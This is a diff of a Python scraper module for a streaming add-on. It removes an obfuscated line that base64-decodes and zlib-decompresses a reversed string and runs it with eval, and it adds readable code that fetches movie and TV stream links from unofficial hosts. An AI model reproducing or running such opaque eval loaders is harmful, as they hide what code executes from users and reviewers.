@@ -1,1 +1,154 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));eval((_)(b'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'))
+# -*- coding: utf-8 -*-
+
+import re
+import requests
+from blackscrapers import parse_qs, urlencode, quote_plus
+from blackscrapers.modules import source_utils
+
+from blackscrapers import custom_base_link
+custom_base = custom_base_link(__name__)
+
+
+class source:
+    def __init__(self):
+        self.priority = 1
+        self.language = ['en', 'el']
+        self.domains = ['xdmovies-stremio.hdmovielover.workers.dev']
+        self.base_link = custom_base or 'https://xdmovies-stremio.hdmovielover.workers.dev'
+        self.movieSearch_link = '/movie?imdbid=%s'
+        self.tvSearch_link = '/series?imdbid=%s&s=%s&e=%s'
+        self.aliases = []
+
+    def movie(self, imdb, tmdb, title, localtitle, aliases, year):
+        try:
+            self.aliases.extend(aliases)
+            url = {'imdb': imdb, 'title': title, 'aliases': aliases, 'year': year}
+            url = urlencode(url)
+            return url
+        except:
+            return
+
+    def tvshow(self, imdb, tvdb, tvshowtitle, localtvshowtitle, aliases, year):
+        try:
+            self.aliases.extend(aliases)
+            url = {'imdb': imdb, 'tvdb': tvdb, 'tvshowtitle': tvshowtitle, 'year': year}
+            url = urlencode(url)
+            return url
+        except:
+            return
+
+    def episode(self, url, imdb, tvdb, title, premiered, season, episode):
+        try:
+            if url is None: return
+
+            url = parse_qs(url)
+            url = dict([(i, url[i][0]) if url[i] else (i, '') for i in url])
+            url['title'], url['premiered'], url['season'], url['episode'] = title, premiered, season, episode
+            url = urlencode(url)
+            return url
+        except:
+            return
+
+    def sources(self, url, hostDict, hostprDict):
+        sources = []
+        try:
+            try:
+                data = parse_qs(url)
+                data = dict([(i, data[i][0]) if data[i] else (i, '') for i in data])
+
+                title = data['tvshowtitle'] if 'tvshowtitle' in data else data['title']
+                year = data['year']
+                imdb = data['imdb']
+                if 'tvshowtitle' in data:
+                    season = data['season']
+                    episode = data['episode']
+                    hdlr = 'S%02dE%02d' % (int(season), int(episode))
+                    url = '%s%s' % (self.base_link, self.tvSearch_link % (imdb, season, episode))
+                else:
+                    url = '%s%s' % (self.base_link, self.movieSearch_link % imdb)
+                    hdlr = year
+                files = requests.get(url, timeout=30).json()['streams']
+            except:
+                return sources
+
+            if files:
+                for file in files:
+                    try:
+                        parts = file['title']
+                        name_part, info_part = parts.split('\n', 1)
+                        name = name_part.strip()
+                        url = file['url']
+                        if 'video-downloads.googleusercontent' in url:
+                            continue
+                        url = url.replace('pixeldrain.dev/u/', 'pixeldrain.dev/api/file/')
+                        try:
+                            dsize = file['behaviorHints']['videoSize']
+                            isize = source_utils.convert_size(dsize)
+                        except:
+                            try:
+                                size_info = file.get('size','')
+                                if size_info:
+                                    rsize = re.search(r'([\d.]+)\s*(KB|MB|GB|TB)', size_info, re.IGNORECASE)
+                                else:
+                                    rsize = re.search(r'([\d.]+)\s*(KB|MB|GB|TB)', info_part, re.IGNORECASE)
+                                value = float(rsize.group(1))
+                                unit = rsize.group(2).upper()
+                                multipliers = {
+                                    'KB': 1024,
+                                    'MB': 1024 ** 2,
+                                    'GB': 1024 ** 3,
+                                    'TB': 1024 ** 4,
+                                }
+
+                                size_bytes = int(value * multipliers[unit])
+                                dsize = size_bytes
+                                isize = source_utils.convert_size(dsize)
+                            except:
+                                dsize = 0
+                                isize = ''
+                        quality, info = source_utils.get_release_quality(name)
+                        info.insert(0, isize)
+                        info = ' | '.join(info)
+                        # if quality == 'cam' and not 'tvshowtitle' in data: continue
+                        sources.append({'source': 'direct', 'quality': quality, 'language': 'en', 'url': url, 'info': info, 
+                                'direct': True, 'debridonly': False, 'name': name, 'size': dsize})
+                    except:
+                        pass
+
+            return sources
+        except:
+            return sources
+
+    def resolve(self, url):
+        if 'download?url=' in url:
+            session = requests.Session()
+            hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'}
+            session.headers.update(hdrs)
+            url = url.split('download?url=')[1]
+            response = session.get(url, timeout=20)
+            if response.status_code == 200:
+                match = re.search(r'href\s*=\s*"(https://gamerxyt.com[^"]+)"', response.text, re.IGNORECASE | re.DOTALL)
+                if match:
+                    url = match.group(1)
+                    response = session.get(url, timeout=20)
+                    if response.status_code == 200:
+                        match = re.compile(r'<a\s+href="([^"]+)"[^/]+/i> Download \[(.+?)\]', re.IGNORECASE | re.DOTALL).findall(response.text)
+                        streams = []
+                        for url, name in match:
+                            if '10Gbps' in name:
+                                continue
+                            url = url.replace('pixeldrain.dev/u/', 'pixeldrain.dev/api/file/')
+                            streams.append((url,name))
+                        if len(streams)==1:
+                            url = streams[0][0]
+                        else:
+                            from blackscrapers.modules import control
+                            ret = control.selectDialog([x[1] for x in streams], heading='Select source')
+                            if ret >= 0:
+                                url = streams[ret][0]
+                            else:
+                                url = streams[0][0]
+                        # url = streams[0][0]
+        return url
+
+
